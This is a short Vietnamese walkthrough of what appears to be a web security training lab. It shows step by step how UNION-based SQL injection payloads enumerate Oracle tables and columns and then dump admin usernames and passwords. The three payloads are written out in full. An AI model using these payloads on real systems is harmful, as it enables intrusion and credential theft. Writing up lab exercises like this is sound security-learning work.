![image](https://user-images.githubusercontent.com/125866921/231405500-ad52ac43-fff3-4297-8f12-d94a6bbaa506.png)

  - Ta cũng thử 1 vài câu lệnh truy vấn như ở lab trước.  
  - Và ở lab này ta sẽ xét ``all_tables``.  
  - Câu lệnh truy vấn như sau:  

        ' UNION SELECT table_name, NULL FROM all_tables --
        
![image](https://user-images.githubusercontent.com/125866921/231407349-6e95d57e-0853-4fbe-a8e1-f5bc72f7a09b.png)

  - Ta tìm được ``USERS_JQERLG`` đây rồi.  
  - Bây giờ ta cần làm theo các bước như ở lab trước và chỉnh sửa 1 tí.  

        ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_JQERLG'--
        
![image](https://user-images.githubusercontent.com/125866921/231408479-5d52f3aa-3a52-45f4-9c81-8a8cda2d833e.png)

  - Tại đây trang web đã hiện ra ``USERNAME_YPLWYJ`` và ``PASSWORD_INTOQU``.  
  - Tới bước này ta thực hiện giống như ở lab trước.  

        ' UNION SELECT USERNAME_YPLWYJ, PASSWORD_INTOQU FROM USERS_JQERLG --
        
![image](https://user-images.githubusercontent.com/125866921/231409268-2cd60d59-1a06-450a-a93e-339389c99fe0.png)

  - Trang web đã hiện ra tài khoản của admin.  
  - Giờ ta chỉ việc đăng nhập và hoàn thành lab thôi.  
